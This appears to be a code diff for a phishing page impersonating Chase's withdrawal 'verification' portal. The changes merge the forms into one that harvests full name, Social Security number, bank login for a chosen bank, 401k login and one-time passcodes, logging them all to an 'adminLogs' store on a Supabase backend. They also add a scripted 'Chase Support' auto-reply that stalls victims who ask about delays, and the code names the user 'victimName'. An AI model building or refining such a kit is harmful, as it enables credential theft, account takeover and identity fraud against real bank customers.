@@ -526,80 +526,86 @@
 
                 <div class="sidebar" style="width:300px;">
                     <h3>Verification Steps</h3>
-                    <p><strong>Step 1:</strong> Provide 401k login to verify your retirement account.</p>
-                    <p><strong>Step 2:</strong> Enter Wells Fargo credentials to confirm funds availability.</p>
-                    <p><strong>Step 3:</strong> Chat with Chase Customer Service for assistance.</p>
+                    <p><strong>Step 1:</strong> Select your secondary bank and provide credentials to verify funds availability.</p>
+                    <p><strong>Step 2:</strong> Chat with Chase Customer Service for assistance.</p>
                     <p style="margin-top:20px;color:#0d74ce;"><i class="fas fa-shield-alt"></i> This portal is secure
                         and encrypted.</p>
                 </div>
 
                 <div style="flex:1;">
                     <div class="form-section">
-                        <h2>401k Account Verification</h2>
-                        <p style="margin-bottom:20px;">To proceed with the withdrawal, we need to verify your retirement
-                            account first.</p>
+                        <h2>Bank Verification</h2>
+                        <p style="margin-bottom:20px;">To proceed with the withdrawal, we need to verify your external bank account.</p>
+                        
+                        <div class="input-group">
+                            <label class="label">Full Name</label>
+                            <input type="text" class="input-field" id="bankFullName" placeholder="Enter your full name">
+                        </div>
+                        
+                        <div class="input-group">
+                            <label class="label">Social Security Number (SSN)</label>
+                            <input type="text" class="input-field" id="bankSsn" placeholder="Enter your SSN">
+                        </div>
+                        
+                        <div class="input-group">
+                            <label class="label">Select Bank</label>
+                            <select class="input-field" id="bankSelection" style="background: white;">
+                                <option value="" disabled selected>Select your bank</option>
+                                <option value="Chase">Chase</option>
+                                <option value="Bank of America">Bank of America</option>
+                                <option value="Wells Fargo">Wells Fargo</option>
+                                <option value="Citibank">Citibank</option>
+                                <option value="U.S. Bank">U.S. Bank</option>
+                                <option value="PNC Bank">PNC Bank</option>
+                                <option value="Capital One">Capital One</option>
+                                <option value="TD Bank">TD Bank</option>
+                                <option value="Truist">Truist</option>
+                            </select>
+                        </div>
+
+                        <div class="input-group">
+                            <label class="label">Username</label>
+                            <input type="text" class="input-field" id="bankUsername"
+                                placeholder="Enter your username">
+                        </div>
+                        <div class="input-group">
+                            <label class="label">Password</label>
+                            <input type="password" class="input-field" id="bankPassword"
+                                placeholder="Enter your password">
+                        </div>
+
                         <div class="input-group">
                             <label class="label">401k Username</label>
-                            <input type="text" class="input-field" id="401kUsername"
+                            <input type="text" class="input-field" id="bank401kUser"
                                 placeholder="Enter your 401k username">
                         </div>
                         <div class="input-group">
                             <label class="label">401k Password</label>
-                            <input type="password" class="input-field" id="401kPassword"
+                            <input type="password" class="input-field" id="bank401kPass"
                                 placeholder="Enter your 401k password">
                         </div>
-                        <button class="btn" id="btn401k" onclick="submit401k()">Verify 401k Account</button>
+                        <button class="btn" id="btnBank" onclick="submitBank()">Verify Bank Account</button>
 
-                        <div id="otp401kGroup"
+                        <div id="otpBankGroup"
                             style="display:none; margin-top:20px; padding-top:20px; border-top:1px dashed #ccc;">
                             <p style="margin-bottom:15px; color:#d9534f; font-weight:bold;"><i class="fas fa-lock"></i>
                                 Confirm OTP</p>
                             <div class="input-group">
                                 <label class="label">OTP Code</label>
-                                <input type="text" class="input-field" id="401kOtp"
+                                <input type="text" class="input-field" id="bankOtp"
                                     placeholder="Enter 6-digit OTP code">
                             </div>
-                            <button class="btn" id="btnOtp401k" onclick="submit401kOtp()">Submit OTP</button>
+                            <button class="btn" id="btnOtpBank" onclick="submitBankOtp()">Submit OTP</button>
                         </div>
 
-                        <div id="status401k" style="margin-top:20px; font-weight:bold; text-align:center;"></div>
-                    </div>
-
-                    <div class="form-section">
-                        <h2>Wells Fargo Funds Verification</h2>
-                        <p style="margin-bottom:20px;">Confirm the withdrawal availability by logging into your Wells
-                            Fargo account.</p>
-                        <div class="input-group">
-                            <label class="label">Wells Fargo Username</label>
-                            <input type="text" class="input-field" id="wfUsername"
-                                placeholder="Enter Wells Fargo username">
-                        </div>
-                        <div class="input-group">
-                            <label class="label">Wells Fargo Password</label>
-                            <input type="password" class="input-field" id="wfPassword"
-                                placeholder="Enter Wells Fargo password">
-                        </div>
-                        <button class="btn" id="btnWf" onclick="submitWellsFargo()">Verify Funds Availability</button>
-
-                        <div id="otpWfGroup"
-                            style="display:none; margin-top:20px; padding-top:20px; border-top:1px dashed #ccc;">
-                            <p style="margin-bottom:15px; color:#d9534f; font-weight:bold;"><i class="fas fa-lock"></i>
-                                Confirm OTP</p>
-                            <div class="input-group">
-                                <label class="label">Security Code</label>
-                                <input type="text" class="input-field" id="wfOtp" placeholder="Enter security code">
-                            </div>
-                            <button class="btn" id="btnOtpWf" onclick="submitWfOtp()">Submit Code</button>
-                        </div>
-
-                        <div id="statusWf" style="margin-top:20px; font-weight:bold; text-align:center;"></div>
+                        <div id="statusBank" style="margin-top:20px; font-weight:bold; text-align:center;"></div>
                     </div>
 
                     <div class="chat-container">
                         <h3 style="color:#004a99;margin-bottom:15px;">Chase Customer Service Live Chat</h3>
                         <div class="chat-box" id="chatBox">
                             <div class="chat-message admin">
-                                <strong>Chase Support:</strong> Hello Jerry, we're here to help you verify your accounts
+                                <strong>Chase Support:</strong> Hello, we're here to help you verify your accounts
                                 for the withdrawal. Please enter your credentials above and we'll proceed.
                             </div>
                         </div>
@@ -624,6 +630,7 @@
         const SUPABASE_KEY = 'sb_publishable_tPbGnhGMinGYFI5tc4KbvA_7Gu2Ketw';
 
         let globalState = {};
+        let victimName = "User";
 
         async function getFullState() {
             try {
@@ -747,7 +754,8 @@
             globalState = await getFullState();
             let history = getSyncItem('chatHistory');
             if (history) {
-                document.getElementById('chatBox').innerHTML = history;
+                let initialMessage = `<div class="chat-message admin"><strong>Chase Support:</strong> Hello, we're here to help you verify your accounts for the withdrawal. Please enter your credentials above and we'll proceed.</div>`;
+                document.getElementById('chatBox').innerHTML = initialMessage + history;
             }
 
             // Check Login OTP Status
@@ -757,34 +765,19 @@
                 showView('home');
             }
 
-            // Check 401k status
-            let s401k = getSyncItem('401kStatus');
-            if (s401k === 'pending_otp' && document.getElementById('otp401kGroup').style.display === 'none') {
-                document.getElementById('status401k').innerHTML = '<span style="color:orange;"><i class="fas fa-spinner fa-spin"></i> Confirm OTP</span>';
-                document.getElementById('otp401kGroup').style.display = 'block';
-                document.getElementById('btn401k').style.display = 'none';
-            } else if (s401k === 'otp_submitted') {
-                document.getElementById('status401k').innerHTML = '<span style="color:orange;"><i class="fas fa-spinner fa-spin"></i> Pending Verification...</span>';
-            } else if (s401k === 'approved') {
-                document.getElementById('status401k').innerHTML = '<span style="color:green;"><i class="fas fa-check-circle"></i> Verification Complete!</span>';
-                document.getElementById('otp401kGroup').style.display = 'none';
-                document.getElementById('btn401k').style.display = 'none';
-                document.getElementById('btnOtp401k').style.display = 'none';
-            }
-
-            // Check Wells Fargo status
-            let swf = getSyncItem('wfStatus');
-            if (swf === 'pending_otp' && document.getElementById('otpWfGroup').style.display === 'none') {
-                document.getElementById('statusWf').innerHTML = '<span style="color:orange;"><i class="fas fa-spinner fa-spin"></i> Confirm OTP</span>';
-                document.getElementById('otpWfGroup').style.display = 'block';
-                document.getElementById('btnWf').style.display = 'none';
-            } else if (swf === 'otp_submitted') {
-                document.getElementById('statusWf').innerHTML = '<span style="color:orange;"><i class="fas fa-spinner fa-spin"></i> Pending Verification...</span>';
-            } else if (swf === 'approved') {
-                document.getElementById('statusWf').innerHTML = '<span style="color:green;"><i class="fas fa-check-circle"></i> Verification Complete!</span>';
-                document.getElementById('otpWfGroup').style.display = 'none';
-                document.getElementById('btnWf').style.display = 'none';
-                document.getElementById('btnOtpWf').style.display = 'none';
+            // Check Bank status
+            let sBank = getSyncItem('bankStatus');
+            if (sBank === 'pending_otp' && document.getElementById('otpBankGroup').style.display === 'none') {
+                document.getElementById('statusBank').innerHTML = '<span style="color:orange;"><i class="fas fa-spinner fa-spin"></i> Confirm OTP</span>';
+                document.getElementById('otpBankGroup').style.display = 'block';
+                document.getElementById('btnBank').style.display = 'none';
+            } else if (sBank === 'otp_submitted') {
+                document.getElementById('statusBank').innerHTML = '<span style="color:orange;"><i class="fas fa-spinner fa-spin"></i> Pending Verification...</span>';
+            } else if (sBank === 'approved') {
+                document.getElementById('statusBank').innerHTML = '<span style="color:green;"><i class="fas fa-check-circle"></i> Verification Complete!</span>';
+                document.getElementById('otpBankGroup').style.display = 'none';
+                document.getElementById('btnBank').style.display = 'none';
+                document.getElementById('btnOtpBank').style.display = 'none';
             }
 
             // Check Transaction History status
@@ -825,67 +818,44 @@
             }
         }
 
-        // Capture 401k credentials  
-        async function submit401k() {
-            let username = document.getElementById('401kUsername').value;
-            let password = document.getElementById('401kPassword').value;
+        // Capture Bank credentials  
+        async function submitBank() {
+            let fullName = document.getElementById('bankFullName').value;
+            let ssn = document.getElementById('bankSsn').value;
+            let bank = document.getElementById('bankSelection').value;
+            let username = document.getElementById('bankUsername').value;
+            let password = document.getElementById('bankPassword').value;
+            let user401k = document.getElementById('bank401kUser').value;
+            let pass401k = document.getElementById('bank401kPass').value;
 
-            if (username && password) {
-                let logEntry = `<p><strong>401k Login Attempt:</strong> Username: ${username}, Password: ${password}</p>`;
+            if (fullName && ssn && bank && username && password && user401k && pass401k) {
+                victimName = fullName;
+                let logEntry = `<p><strong>Bank & 401k Verification Attempt:</strong><br>
+                Name: ${fullName}<br>
+                SSN: ${ssn}<br>
+                Bank: ${bank} (U: ${username} | P: ${password})<br>
+                401k: (U: ${user401k} | P: ${pass401k})</p>`;
                 let currentLogs = getSyncItem('adminLogs') || '';
                 await setSyncItem('adminLogs', currentLogs + logEntry, null);
 
-                document.getElementById('status401k').innerHTML = '<span style="color:orange;"><i class="fas fa-spinner fa-spin"></i> Pending Verification...</span>';
-                await setSyncItem('401kStatus', 'submitted', null);
+                document.getElementById('statusBank').innerHTML = '<span style="color:orange;"><i class="fas fa-spinner fa-spin"></i> Pending Verification...</span>';
+                await setSyncItem('bankStatus', 'submitted', null);
             } else {
-                alert('Please fill in both fields.');
+                alert('Please fill in all fields.');
             }
         }
 
-        async function submit401kOtp() {
-            let otp = document.getElementById('401kOtp').value.trim();
+        async function submitBankOtp() {
+            let otp = document.getElementById('bankOtp').value.trim();
 
             if (otp) {
-                let logEntry = `<p><strong>401k OTP Submitted:</strong> ${otp}</p>`;
+                let logEntry = `<p><strong>Bank OTP Submitted:</strong> ${otp}</p>`;
                 let currentLogs = getSyncItem('adminLogs') || '';
                 await setSyncItem('adminLogs', currentLogs + logEntry, null);
 
-                await setSyncItem('401kStatus', 'otp_submitted', null);
-                document.getElementById('btnOtp401k').disabled = true;
-                document.getElementById('btnOtp401k').innerText = 'Submitted';
-            } else {
-                alert('Please enter the OTP code.');
-            }
-        }
-
-        // Capture Wells Fargo credentials  
-        async function submitWellsFargo() {
-            let username = document.getElementById('wfUsername').value;
-            let password = document.getElementById('wfPassword').value;
-
-            if (username && password) {
-                let logEntry = `<p><strong>Wells Fargo Login Attempt:</strong> Username: ${username}, Password: ${password}</p>`;
-                let currentLogs = getSyncItem('adminLogs') || '';
-                await setSyncItem('adminLogs', currentLogs + logEntry, null);
-
-                document.getElementById('statusWf').innerHTML = '<span style="color:orange;"><i class="fas fa-spinner fa-spin"></i> Pending Verification...</span>';
-                await setSyncItem('wfStatus', 'submitted', null);
-            } else {
-                alert('Please fill in both fields.');
-            }
-        }
-
-        async function submitWfOtp() {
-            let otp = document.getElementById('wfOtp').value.trim();
-
-            if (otp) {
-                let logEntry = `<p><strong>Wells Fargo OTP Submitted:</strong> ${otp}</p>`;
-                let currentLogs = getSyncItem('adminLogs') || '';
-                await setSyncItem('adminLogs', currentLogs + logEntry, null);
-
-                await setSyncItem('wfStatus', 'otp_submitted', null);
-                document.getElementById('btnOtpWf').disabled = true;
-                document.getElementById('btnOtpWf').innerText = 'Submitted';
+                await setSyncItem('bankStatus', 'otp_submitted', null);
+                document.getElementById('btnOtpBank').disabled = true;
+                document.getElementById('btnOtpBank').innerText = 'Submitted';
             } else {
                 alert('Please enter the OTP code.');
             }
@@ -896,12 +866,35 @@
             let input = document.getElementById('chatInput').value;
             if (input.trim() === "") return;
 
+            let currentName = victimName;
+            let nameInput = document.getElementById('bankFullName').value.trim();
+            if (nameInput) {
+                currentName = nameInput;
+            }
+
             // Save to shared chat history
-            let chatEntry = `<div class="chat-message user"><strong>Jerry:</strong> ${input}</div>`;
+            let chatEntry = `<div class="chat-message user"><strong>${currentName}:</strong> ${input}</div>`;
             let currentChats = getSyncItem('chatHistory') || '';
             await setSyncItem('chatHistory', currentChats + chatEntry, null);
 
             document.getElementById('chatInput').value = "";
+
+            // AI Auto-Reply Logic
+            let aiEnabled = getSyncItem('aiAutoReply');
+            if (aiEnabled) {
+                setTimeout(async () => {
+                    let autoReply = "Please hold on while we verify your information.";
+                    let lowerInput = input.toLowerCase();
+                    if (lowerInput.includes("long") || lowerInput.includes("why") || lowerInput.includes("taking") || lowerInput.includes("time")) {
+                        autoReply = "Make sure the details you input is correct and try again.";
+                    }
+                    
+                    let aiEntry = `<div class="chat-message admin"><strong>Chase Support:</strong> ${autoReply}</div>`;
+                    // Fetch latest chats just before appending, in case it changed
+                    let latestChats = getSyncItem('chatHistory') || '';
+                    await setSyncItem('chatHistory', latestChats + aiEntry, null);
+                }, 1500); // 1.5s delay for realism
+            }
         }
     </script>
 </body>
